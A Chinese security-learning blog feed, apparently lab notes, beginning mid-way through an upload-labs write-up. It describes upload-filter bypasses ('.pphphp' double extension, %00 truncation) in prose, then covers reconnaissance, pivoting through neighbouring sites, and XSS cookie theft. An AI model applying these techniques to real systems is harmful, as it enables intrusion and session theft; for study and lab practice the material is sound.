<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>代码审计,发现将匹配到的黑名单的名字进行空串替换,由于其只是替换一次,没有循环判断。<br><img src="https://pic.imgdb.cn/item/6524f7f7c458853aef9b7c55.png" alt="图十五" title="pass11部分代码"><br>所以直接抓包将filename值改为.pphphp即可。<br><img src="https://pic.imgdb.cn/item/6524f803c458853aef9b7df7.png" alt="图十六" title="pass11burp抓包"><br>发现文件成功上传至指定目录,访问这个文件也可以正常执行php代码。</p>
<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>代码审计,发现此处换成了白名单验证,且提交方法为GET,更难绕过,但是发现是代码存在一个”save_path”<br>那么可以使用%00截断。如:a.php.txt是txt类型文件,但是a.php%00.txt是一个php类型文件。<br><img src="https://pic.imgdb.cn/item/6524fb68c458853aef9ccdde.png" alt="图十七" title="pass12部分代码"><br>直接抓包修改,如图所示:<br><img src="https://pic.imgdb.cn/item/6524fbe5c458853aef9d0143.png" alt="图十八" title="pass12burp抓包"><br>发现文件成功上传至指定目录,访问这个文件也可以正常执行php代码。</p>
<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>代码审计,发现此处换成了白名单验证,且提交方法为POST,更难绕过,但是发现是代码存在一个”save_path”<br><img src="https://pic.imgdb.cn/item/6524fca0c458853aef9d9ee2.png" alt="图十九" title="pass13部分代码"><br>然后是和Pass-12一样思路,只不过这里为POST方法提交数据,那么就是0x00截断。<br>直接抓包修改,如图所示,post方式不会自行解码，所以要对%00进行urldecode编码:<br><img src="https://pic.imgdb.cn/item/6524fdf3c458853aef9e2e36.png" alt="图二十" title="pass13burp抓包"><br>发现文件成功上传至指定目录,访问这个文件也可以正常执行php代码。</p>
]]></content>
      <categories>
        <category>Recorder</category>
        <category>文件操作安全</category>
      </categories>
      <tags>
        <tag>实战练习心得</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集（二）</title>
    <url>/2023/09/17/xinxishoujiEr/</url>
    <content><![CDATA[<h2 id="信息收集（二）"><a href="#信息收集（二）" class="headerlink" title="信息收集（二）"></a>信息收集（二）</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">！！！写在前面：信息收集小工具，途径如下</span><br></pre></td></tr></table></figure>
<p><a href="https://zhuanlan.zhihu.com/p/529487307">信息收集思路&amp;工具</a></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">流程如下，图片来源于网络，侵删</span><br></pre></td></tr></table></figure>
<p><img src="/img/liucheng.png" alt="信息收集的流程" title="流程"></p>
<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、web模块重点还是无cdn的情况，因为若有cdn，绕过后，就来到无cdn的情况。</span><br><span class="line">无cdn的情况，重点又来到了下面说的站点搭建。(以下介绍的都以无cdn为前提)。</span><br><span class="line"><span class="number">2</span>、网站web没问题，可以对系统进行安全测试，系统没问题，可以对第三方应用</span><br><span class="line">进行安全测试。（拿下系统权限，则网站也可以轻轻松松拿下啦！）</span><br></pre></td></tr></table></figure>
<h4 id="CMS识别技术"><a href="#CMS识别技术" class="headerlink" title="CMS识别技术"></a>CMS识别技术</h4><h5 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h5><figure class="highlight objectivec"><table><tr><td class="code"><pre><span class="line"><span class="built_in">CMS</span>（Content Management System）即内容管理系统，是一个用于管理网站内容的软件。在互联网上，有很多不同的</span><br><span class="line"><span class="built_in">CMS</span>，如WordPress、Joomla、Drupal等等。而<span class="built_in">CMS</span>识别就是通过特定工具或脚本来判断目标网站所使用的<span class="built_in">CMS</span>类型。</span><br></pre></td></tr></table></figure>
<h5 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h5><figure class="highlight objectivec"><table><tr><td class="code"><pre><span class="line">whatweb、w3af、<span class="built_in">CMSmap</span></span><br></pre></td></tr></table></figure>
<h4 id="源码获取技术"><a href="#源码获取技术" class="headerlink" title="源码获取技术"></a>源码获取技术</h4><h5 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">源代码抓取是一种从互联网上获取信息的方法。它通过获取网页的源代码，分析其中的<span class="selector-tag">HTML</span>标签、CSS样式和JavaScript</span><br><span class="line">脚本等内容，从而提取出所需的信息</span><br></pre></td></tr></table></figure>
<h5 id="源码获取方式"><a href="#源码获取方式" class="headerlink" title="源码获取方式"></a>源码获取方式</h5><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.直接获取网页源代码：通过HTTP请求获取网页源代码，然后对其进行解析和处理。</span><br><span class="line"><span class="number">2</span>.使用第三方库：如Python中的<span class="keyword">BeautifulSoup、Scrapy等库，可以方便地进行源代码抓取。</span></span><br><span class="line"><span class="keyword"></span><span class="number">3</span>.使用工具软件：如Fiddler、Charles等工具，可以监控和分析HTTP请求，获取网页源代码。</span><br></pre></td></tr></table></figure>
<h4 id="架构信息获取-即判断操作系统类型"><a href="#架构信息获取-即判断操作系统类型" class="headerlink" title="架构信息获取(即判断操作系统类型)"></a>架构信息获取(即判断操作系统类型)</h4><h5 id="架构信息获取方式"><a href="#架构信息获取方式" class="headerlink" title="架构信息获取方式"></a>架构信息获取方式</h5><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>．Nmap扫描识别端口和OS的类型。</span><br><span class="line"><span class="number">2</span>．网站区分大小写判断系统。</span><br><span class="line"><span class="number">3</span>．脚本识别数据库 — asp+<span class="keyword">Access</span>；PHP+MySQL；aspx+mssql；jsp+mssql/orcale；Python+mogodb。</span><br><span class="line"><span class="number">4</span>．os识别数据库 — windows才有<span class="keyword">Access</span>+sqlserver。</span><br><span class="line"><span class="number">5</span>．端口扫描 — 端口号对应不同的数据库。</span><br><span class="line"><span class="number">6</span>．Nmap扫描第三方平台和软件—phpmyadmin。</span><br></pre></td></tr></table></figure>

<h3 id="站点搭建"><a href="#站点搭建" class="headerlink" title="站点搭建"></a>站点搭建</h3><h4 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h4><h5 id="搭建习惯-目录型站点"><a href="#搭建习惯-目录型站点" class="headerlink" title="搭建习惯-目录型站点"></a>搭建习惯-目录型站点</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">意思就是当我们打开一个网站后，如ski<span class="selector-class">.bku</span><span class="selector-class">.edu</span>.cn，假设其路径为D:\www\root（这是一套程序）；现在若探测到还有</span><br><span class="line">一个网址，如ski<span class="selector-class">.bku</span><span class="selector-class">.edu</span>.cn\bbt（这又是另一套程序，两套程序有两种漏洞形式），那么其路径就是是D:\www\bbt。</span><br><span class="line">若不清楚ski<span class="selector-class">.bku</span><span class="selector-class">.edu</span>.cn用什么框架搭建的，我们可以探测ski<span class="selector-class">.bku</span><span class="selector-class">.edu</span>.cn\bbt（甚至是abc目录，kkk目录，通过目</span><br><span class="line">录扫描工具爬行），只要我探测到一个，那么我们就可以从这个点渗透（查找这个框架有什么漏洞）。</span><br></pre></td></tr></table></figure>
<h5 id="搭建习惯-端口类站点"><a href="#搭建习惯-端口类站点" class="headerlink" title="搭建习惯-端口类站点"></a>搭建习惯-端口类站点</h5><figure class="highlight"><table><tr><td class="code"><pre><span class="line">与第一种类似，只不过这种是通过端口探测去访问页面。（端口扫描）</span><br></pre></td></tr></table></figure>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">前两种站点为什么一个会影响另一个呢？因为这两套程序本质都运行在一个服务器上，所以一个出了问题肯定会影响另一个（网站）。</span><br></pre></td></tr></table></figure>
<h5 id="搭建习惯-子域名站点"><a href="#搭建习惯-子域名站点" class="headerlink" title="搭建习惯-子域名站点"></a>搭建习惯-子域名站点</h5><figure class="highlight dos"><table><tr><td class="code"><pre><span class="line">与前两种类似，都是找不同的程序，获取更多机会渗透。但是这种是通过修改二级域名来获取不同的程序，如为www.baiw.<span class="built_in">net</span>与</span><br><span class="line">bbs.baiw.<span class="built_in">net</span>；而且这两套程序可能不在同一个服务器上面的。此时<span class="built_in">ping</span>一下，若收到IP相同的响应，则在同一个服务器上；</span><br><span class="line">若在同一网段上（若<span class="number">123</span>.<span class="number">103</span>.<span class="number">19</span>.<span class="number">198</span>与<span class="number">123</span>.<span class="number">103</span>.<span class="number">19</span>.<span class="number">196</span>），就涉及到内网了。</span><br></pre></td></tr></table></figure>
<h5 id="搭建习惯-类似域名站点（对比较正规网站去做较有意义）"><a href="#搭建习惯-类似域名站点（对比较正规网站去做较有意义）" class="headerlink" title="搭建习惯-类似域名站点（对比较正规网站去做较有意义）"></a>搭建习惯-类似域名站点（对比较正规网站去做较有意义）</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">若对某些不同的域名（一般是顶级域名不同）访问，出现相同的网站，其实就是多个域名指向了同一个<span class="built_in">ip</span>，可以分别对这些域名进</span><br><span class="line">以上三种操作。但是别人是不会告诉你他有几个后缀（域名），得靠自己去猜（优先改顶级域名，如<span class="meta">cn</span>、com、net、org）。</span><br><span class="line"><span class="number">1</span>、站长工具-- SEQ综合查询--备案信息查询。</span><br><span class="line"><span class="number">2</span>、百度、Google等搜索引擎搜目标官网。</span><br></pre></td></tr></table></figure>
<h5 id="搭建习惯-旁注-c段站点"><a href="#搭建习惯-旁注-c段站点" class="headerlink" title="搭建习惯-旁注, c段站点"></a>搭建习惯-旁注, c段站点</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">旁注：同服务器，不同站点。多个网站放在同一个服务器上，其中一个网站是自己的目标。</span><br><span class="line">前提条件：有多个服务器站点。</span><br><span class="line"><span class="symbol">eg:</span>若<span class="number">192</span>.<span class="number">100</span>.<span class="number">8</span>.<span class="number">123</span>为服务器的<span class="built_in">ip</span>地址，上面有www.a.com、www.b.com、.......，假</span><br><span class="line">设我想渗透b站点，但是无从下手，那么我可以先去渗透除b外的站点，再跳到b。</span><br><span class="line">通过<span class="built_in">ip</span>查旁注：直接搜旁注查询。</span><br></pre></td></tr></table></figure>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">c段：同网段不同服务器不同站点。较麻烦，难度较高。</span><br><span class="line">前提条件：独立站点服务器。</span><br><span class="line">eg:若<span class="number">192.100.8.123</span>为服务器的ip地址，上面有www.a.com、www.b.com、.......，同</span><br><span class="line">时<span class="number">192.100.8.121</span>是同网段的另一个服务器ip，上面有www.c.com、www.d.com、.......</span><br><span class="line">假设我想获得b站点的权限，先旁注，却发现无法提权，那么这时候就要考虑c段，即是，对</span><br><span class="line">它的同网段下的另一个服务器下的站点进行提权，进而获取到这个服务器（<span class="number">192.100.8.121</span>）</span><br><span class="line">的权限，在获取<span class="number">192.100.8.123</span>的权限，最后获得这个服务器下b站点的权限。</span><br></pre></td></tr></table></figure>
<p>演示：<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=7&vd_source=d32bce54780cf3d9710df43274886fde">旁注(51:00处)</a></p>
<h5 id="搭建习惯-搭建软件特征站点"><a href="#搭建习惯-搭建软件特征站点" class="headerlink" title="搭建习惯-搭建软件特征站点"></a>搭建习惯-搭建软件特征站点</h5><figure class="highlight"><table><tr><td class="code"><pre><span class="line">通过发现搭建软件的安全问题来渗透某个网站。</span><br></pre></td></tr></table></figure>
<h4 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h4><h5 id="什么是WAF应用"><a href="#什么是WAF应用" class="headerlink" title="什么是WAF应用?"></a>什么是WAF应用?</h5><figure class="highlight"><table><tr><td class="code"><pre><span class="line"> 用以解决诸如防火墙一类传统设备束手无策的Web应用安全问题。与传统防火墙不同，WAF工作在应用层，因此对Web应用防护具有先天</span><br><span class="line"> 的技术优势。基于对Web应用业务和逻辑的深刻理解，WAF对来自Web应用程序客户端的各类请求进行内容检测和验证，确保其安全性与</span><br><span class="line"> 合法性，对非法的请求予以实时阻断，从而对各类网站站点进行有效防护。</span><br><span class="line">（个人性质的网站，一般软件形式，企业性质的，一般硬件形式）</span><br></pre></td></tr></table></figure>
<h5 id="如何快速识别WAF"><a href="#如何快速识别WAF" class="headerlink" title="如何快速识别WAF?"></a>如何快速识别WAF?</h5><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、<span class="built_in">wafw00f</span>(kali自带)。</span><br><span class="line"><span class="number">2</span>、打开控制台看响应返回的数据包。</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/qq_53079406/article/details/122961195">kali下使用wafw00f</a></p>
<h5 id="识别WAF对于安全测试的意义"><a href="#识别WAF对于安全测试的意义" class="headerlink" title="识别WAF对于安全测试的意义?"></a>识别WAF对于安全测试的意义?</h5><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、识别出若有waf，可以提前做好渗透前准备。</span><br><span class="line"><span class="number">2</span>、若识别出有waf，不要直接去扫这个网站的<span class="built_in">ip</span>，会被拉黑。</span><br></pre></td></tr></table></figure>

<h3 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h3><p><a href="https://www.yii666.com/blog/665657.html">架构信息获取</a><br><a href="https://baijiahao.baidu.com/s?id=1764373362445877893&wfr=spider&for=pc">源码获取方式</a><br><a href="https://baijiahao.baidu.com/s?id=1764373362445877893&wfr=spider&for=pc">CMS识别</a></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集（三）</title>
    <url>/2023/09/18/xinxishoujiThree/</url>
    <content><![CDATA[<h2 id="信息收集（三）——APP以及其他资产的收集"><a href="#信息收集（三）——APP以及其他资产的收集" class="headerlink" title="信息收集（三）——APP以及其他资产的收集"></a>信息收集（三）——APP以及其他资产的收集</h2><h2 id="APP信息收集"><a href="#APP信息收集" class="headerlink" title="APP信息收集"></a>APP信息收集</h2><h3 id="获取apk数据包隐藏的数据信息"><a href="#获取apk数据包隐藏的数据信息" class="headerlink" title="获取apk数据包隐藏的数据信息"></a>获取apk数据包隐藏的数据信息</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">burpsuite设置代理抓包配合其他反编译工具<span class="comment">(个人用的是：漏了个大洞)</span>，综合进行分析。</span><br><span class="line">！！！若分析出来涉及到web的，即解析出来web网站，可以直接按照web的思路走。若不</span><br><span class="line">涉及到web，可以尝试提取，反编译，等操作。</span><br></pre></td></tr></table></figure>
<h3 id="某ip无WEB框架下的第三方测试"><a href="#某ip无WEB框架下的第三方测试" class="headerlink" title="某ip无WEB框架下的第三方测试"></a>某ip无WEB框架下的第三方测试</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、各种端口一顿乱扫 --<span class="keyword">nmap</span>(等待结果的同时用三款黑暗引擎扫ip等，若扫域名，把www去掉)</span><br><span class="line">   各种接口一顿乱扫</span><br><span class="line">   接口部分一顿测试</span><br><span class="line">   ---来自迪总</span><br><span class="line"><span class="number">2</span>、site:<span class="keyword">abc</span>.<span class="keyword">com</span>（查找子域名）</span><br><span class="line">   inurl(它的作用是限定在url中搜索，就是地址栏里的内容。使用格式是：“inur<span class="variable">l:xxx</span>”、</span><br><span class="line">   “inur<span class="variable">l:xxx</span> 关键词”、“关键词 inur<span class="variable">l:xxx</span>”)</span><br></pre></td></tr></table></figure>
<h3 id="新知识点–robots-txt"><a href="#新知识点–robots-txt" class="headerlink" title="新知识点–robots.txt"></a>新知识点–robots.txt</h3><h4 id="这是什么东西？"><a href="#这是什么东西？" class="headerlink" title="这是什么东西？"></a>这是什么东西？</h4><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">robots.txt是一个协议,我们可以把它理解为一个网站的<span class="string">&quot;管家&quot;</span>,它会告诉搜索引擎哪些页面</span><br><span class="line">可以访问,哪些页面不能访问。也可以规定哪些搜索引擎可以访问我们的网站而哪些搜索引擎</span><br><span class="line">不能爬取我们网站的信息等等,是网站管理者指定的<span class="string">&quot;君子协议&quot;</span>。</span><br></pre></td></tr></table></figure>
<h4 id="我该怎么进入这个文件？"><a href="#我该怎么进入这个文件？" class="headerlink" title="我该怎么进入这个文件？"></a>我该怎么进入这个文件？</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">在浏览器的网址搜索栏中，输入网站的根域名，然后再输入/robot.txt即可查看。比如，百度</span><br><span class="line">的robots.txt网址为 “https:<span class="regexp">//</span>www.baidu.com/robots.txt”。</span><br></pre></td></tr></table></figure>
<h2 id="其他资产-收集"><a href="#其他资产-收集" class="headerlink" title="其他资产 收集"></a>其他资产 收集</h2><h3 id="Github监控"><a href="#Github监控" class="headerlink" title="Github监控"></a>Github监控</h3><figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">便于收集整理最新<span class="built_in">exp</span>或poc </span><br><span class="line">便于发现相关测试目标的资产</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/penriver/article/details/127826473">exp、poc等相关术语</a><br><a href="https://www.yuque.com/weiker/xiaodi/qdao80">监听小工具&#x2F;脚本</a></p>
<h3 id="各种子域名查询"><a href="#各种子域名查询" class="headerlink" title="各种子域名查询"></a>各种子域名查询</h3><h3 id="DNS-备案-证书"><a href="#DNS-备案-证书" class="headerlink" title="DNS,备案,证书"></a>DNS,备案,证书</h3><h3 id="全球节点请求cdn"><a href="#全球节点请求cdn" class="headerlink" title="全球节点请求cdn"></a>全球节点请求cdn</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">枚举爆破或解析子域名对应</span><br><span class="line">便于发现管理员相关的注册信息</span><br></pre></td></tr></table></figure>
<h3 id="黑暗引擎相关搜索"><a href="#黑暗引擎相关搜索" class="headerlink" title="黑暗引擎相关搜索"></a>黑暗引擎相关搜索</h3><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fofa,</span> shodan, zoomeye</span><br></pre></td></tr></table></figure>
<h3 id="微信公众号接口获取"><a href="#微信公众号接口获取" class="headerlink" title="微信公众号接口获取"></a>微信公众号接口获取</h3><h3 id="内部群内部资源"><a href="#内部群内部资源" class="headerlink" title="内部群内部资源"></a>内部群内部资源</h3><h3 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h3><p><a href="https://blog.csdn.net/m0_51683653/article/details/127252676">robits.txt</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=8&vd_source=d32bce54780cf3d9710df43274886fde">信息收集演示！！！较完整（可二刷）</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=9&vd_source=d32bce54780cf3d9710df43274886fde">src目标中的信息收集全覆盖，伪实战，值得一看</a></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>xss跨站基本知识</title>
    <url>/2023/10/09/xss1/</url>
    <content><![CDATA[<h2 id="XSS跨站"><a href="#XSS跨站" class="headerlink" title="XSS跨站"></a>XSS跨站</h2><h3 id="XSS跨站定义"><a href="#XSS跨站定义" class="headerlink" title="XSS跨站定义"></a>XSS跨站定义</h3><p>跨站点脚本攻击，简称XSS，是指攻击者利用网站存在的漏洞，通过在网站中注入恶意脚本代码，从而使得用户在访问该网站时受到攻击。这些恶意脚本代码通常是JavaScript 代码，它们可以窃取用户的敏感信息，如用户名、密码等，并将这些信息发送到攻击者的服务器。和用户交互的地方均有可能产生跨站漏洞。</p>
<h3 id="XSS跨站原理"><a href="#XSS跨站原理" class="headerlink" title="XSS跨站原理"></a>XSS跨站原理</h3><p><img src="https://pic.imgdb.cn/item/65241563c458853aef6a1949.png" alt="图一" title="XSS跨站学习大纲(侵权联删)"><br>XSS攻击的本质是利用Web应用程序中的漏洞，向网页注入恶意脚本代码，然后将这些代码嵌入到网页中，当其他用户访问这个网页时，恶意脚本将会被执行。<br>攻击者通常会在Web应用程序的输入框、评论框、搜索框等可输入内容的地方输入特定的脚本代码，这些代码可以被Web应用程序直接插入到网页中，导致网页上的所有用户都会受到攻击。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">是前端漏洞,感觉和SQL注入差不多,只不过注入的是<span class="keyword">js</span>语句。<span class="keyword">js</span>脚本能实现什么,XSS就能实现什么。</span><br></pre></td></tr></table></figure>
<h3 id="XSS跨站前提条件"><a href="#XSS跨站前提条件" class="headerlink" title="XSS跨站前提条件"></a>XSS跨站前提条件</h3><p>1、浏览器内核版本(IE、或其他高版本浏览器禁用js脚本)。<br>2、js代码的编写。<br><a href="https://baijiahao.baidu.com/s?id=1770456094078258302&wfr=spider&for=pc">XSS详解</a></p>
<h3 id="XSS跨站分类"><a href="#XSS跨站分类" class="headerlink" title="XSS跨站分类"></a>XSS跨站分类</h3><p>1、反射型(危害较小,后端语言进行数据处理)<br>(1)、需要用户(被攻击者)去触发,相当于一次交互的过程。<br>(2)、！！ 发包 x&#x3D;xiaodi&#x3D;&gt;x.php(根据代码类型返回相应的处理结果,返回的不一定是php脚本执行结果)&#x3D;&gt;回包<br>(3)、只能自己排除其他漏洞后猜测。<br>2、存储型(危害大)–也是后端语言数据处理<br>(1)、如留言板、评论区等,攻击者填入数据(js脚本)后,会存储到数据库,那么我下一次访问也会显示(查询数据库)。攻击会一直持续到数据被删除为止。<br>(2)、！！ 发包 x&#x3D;xiaodi&#x3D;&gt;x.php(根据代码类型返回相应的处理结果,返回的不一定是php脚本执行结果)&#x3D;&gt;写到数据库的某个表&#x3D;&gt;x.php&#x3D;&gt;回显。<br>(3)、只能自己排除其他漏洞后猜测。<br>3、DOM型(是反射型的一种,大部分可以看作直接给前端处理,没有给后端)–js前端语言数据处理<br>(1)、DOM就是在操作网站的标签或者属性，是提前预写好的，DOM可以结合前面两个。<br>(2)、！！ 发包 x&#x3D;xiaodi&#x3D;&gt;x.php(根据代码类型返回相应的处理结果,返回的不一定是php脚本执行结果)&#x3D;&gt;本地浏览器的静态前端代码&#x3D;&gt;x.php(注意:若还有其他数据给x.php才继续后续操作,否则传给前端后直接回显)&#x3D;&gt;回包。<br>(3)、可以通过代码自己发现。<br><img src="https://pic.imgdb.cn/item/652541f0c458853aefb3db7a.png" alt="图一" title="DOM树"><br><img src="https://pic.imgdb.cn/item/6525422dc458853aefb3e3d5.jpg" alt="图二" title="放射&amp;存储型"><br><img src="https://pic.imgdb.cn/item/6525422dc458853aefb3e3d5.jpg" alt="图三" title="DOM型"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=24&vd_source=d32bce54780cf3d9710df43274886fde">DOM型介绍以及重温前后端的区别:27:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=24&vd_source=d32bce54780cf3d9710df43274886fde">三种XSS的区别(建议多刷):35:00</a></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">以下形象的解释搬运自小迪安全</span><br><span class="line"><span class="number">1</span>.DOM型(不经过服务器，前端<span class="keyword">js代码的利用)：</span></span><br><span class="line"><span class="keyword"></span>本地利用漏洞，这种漏洞存在于页面中客户端脚本自身。其攻击过程如下所示：</span><br><span class="line">Alice给<span class="keyword">Bob发送一个恶意构造了Web的URL。</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">Bob点击并查看了这个URL。</span></span><br><span class="line"><span class="keyword"></span>恶意页面中的<span class="keyword">JavaScript打开一个具有漏洞的HTML页面并将其安装在Bob电脑上。</span></span><br><span class="line"><span class="keyword"></span>具有漏洞的HTML页面包含了在<span class="keyword">Bob电脑本地域执行的JavaScript。</span></span><br><span class="line"><span class="keyword"></span>Alice的恶意脚本可以在<span class="keyword">Bob的电脑上执行Bob所持有的权限下的命令。</span></span><br><span class="line"><span class="keyword"></span><span class="number">2</span>.反射型：</span><br><span class="line">这种漏洞和类型A有些类似，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能够注入到动态页面中。</span><br><span class="line">其攻击过程如下：</span><br><span class="line">Alice经常浏览某个网站，此网站为<span class="keyword">Bob所拥有。Bob的站点运行Alice使用用户名/密码进行登录，并存储敏感信息(比如银行帐户信息)。</span></span><br><span class="line"><span class="keyword"></span>Charly发现<span class="keyword">Bob的站点包含反射性的XSS漏洞。</span></span><br><span class="line"><span class="keyword"></span>Charly编写一个利用漏洞的URL，并将其冒充为来自<span class="keyword">Bob的邮件发送给Alice。</span></span><br><span class="line"><span class="keyword"></span>Alice在登录到<span class="keyword">Bob的站点后，浏览Charly提供的URL。</span></span><br><span class="line"><span class="keyword"></span>嵌入到URL中的恶意脚本在Alice的浏览器中执行，就像它直接来自<span class="keyword">Bob的服务器一样。此脚本盗窃敏感信息(授权、信用卡、帐号信息等)然后在Alice完全不知情的情况下将这些信息发送到Charly的Web站点。</span></span><br><span class="line"><span class="keyword"></span><span class="number">3</span>.存储型（长久型，危害最大）：</span><br><span class="line">该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。其攻击过程如下：</span><br><span class="line"><span class="keyword">Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。</span></span><br><span class="line"><span class="keyword"></span>Charly注意到<span class="keyword">Bob的站点具有类型C的XSS漏洞。</span></span><br><span class="line"><span class="keyword"></span>Charly发布一个热点信息，吸引其它用户纷纷阅读。</span><br><span class="line"><span class="keyword">Bob或者是任何的其他人如Alice浏览该信息，其会话cookies或者其它信息将被Charly盗走。</span></span><br><span class="line"><span class="keyword"></span>类型<span class="number">1</span>直接威胁用户个体，而类型<span class="number">2</span>和类型<span class="number">3</span>所威胁的对象都是企业级Web应用。</span><br></pre></td></tr></table></figure>
<h3 id="XSS跨站危害"><a href="#XSS跨站危害" class="headerlink" title="XSS跨站危害"></a>XSS跨站危害</h3><p>● 1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号<br>● 2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力<br>● 3、盗窃企业重要的具有商业价值的资料<br>● 4、非法转账<br>● 5、强制发送电子邮件<br>● 6、网站挂马<br>● 7、控制受害者机器向其它网站发起攻击（重定向语句）<br>● 8、窃取cookie的sessionid，冒充登录。<br>XSS攻击利用到最大就需要自己有台服务器用于窃取信息，还要利用一点社工，骗取别人点击恶意的链接。</p>
<h2 id="XSS跨站攻击方式"><a href="#XSS跨站攻击方式" class="headerlink" title="XSS跨站攻击方式"></a>XSS跨站攻击方式</h2><h3 id="XSS与cookie"><a href="#XSS与cookie" class="headerlink" title="XSS与cookie"></a>XSS与cookie</h3><p>就是诱使目标点击&#x2F;登录某个页面,在他进入页面的一瞬间取得其cookie。这样我们便可以进入到对方的后台。<br>cookie:类似于身份信息,用于验证身份。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=24&vd_source=d32bce54780cf3d9710df43274886fde">XSS与cookie(听讲知识点):54:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=24&vd_source=d32bce54780cf3d9710df43274886fde">XSS平台的使用:1:03:00</a><br><a href="https://blog.csdn.net/weixin_44657888/article/details/124692782">kali搭建BeEF联系XSS跨站</a></p>
<h3 id="如何发现XSS跨站"><a href="#如何发现XSS跨站" class="headerlink" title="如何发现XSS跨站"></a>如何发现XSS跨站</h3><p>1、工具扫<br>2、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=24&vd_source=d32bce54780cf3d9710df43274886fde">自己搭建平台XSS跨站攻击演示(略微提了一嘴如何发现):1:25:00</a></p>
<h2 id="cookie与session"><a href="#cookie与session" class="headerlink" title="cookie与session"></a>cookie与session</h2><p>1、cookie存在浏览器 session 存在服务器<br>2、要管理员登录到后台的时候盗取的cookie才是真正的管理员cookie,否则只是普通用户的cookie。<br>3、cookie储存到本地,存活时间较长,小中型网站使用;session(占用服务器资源) 也称为会话,存储到服务器,存活时间较短,大型网站使用。<br>4、cookie是用户的身份证，session是服务器的用户身份核查表<br>5、它们都是用户凭据。<br>6、盗取cookie、会话(session)劫持。</p>
<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>1、XSS实现的条件较为苛刻,既要浏览器版本满足,要有漏洞,对方的浏览器不会拦截,对方有登陆过且留下痕迹,而且要对方触发。<br>2、需要配合一定社工。<br>3、发现存在这个漏洞可以尝试去用一下。<br>4、主要是对方管理员要经常登录。</p>
]]></content>
      <categories>
        <category>XSS跨站</category>
      </categories>
      <tags>
        <tag>XSS跨站</tag>
      </tags>
  </entry>
  <entry>
    <title>跨站订单盗取与webshell箱子反杀</title>
    <url>/2023/10/10/xss2/</url>
    <content><![CDATA[<h2 id="演示简单的XSS"><a href="#演示简单的XSS" class="headerlink" title="演示简单的XSS"></a>演示简单的XSS</h2><h3 id="订单系统XSS盲打-平台"><a href="#订单系统XSS盲打-平台" class="headerlink" title="订单系统XSS盲打_平台"></a>订单系统XSS盲打_平台</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">跨站演示:3:00</a><br>postman下载地址:<a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p>
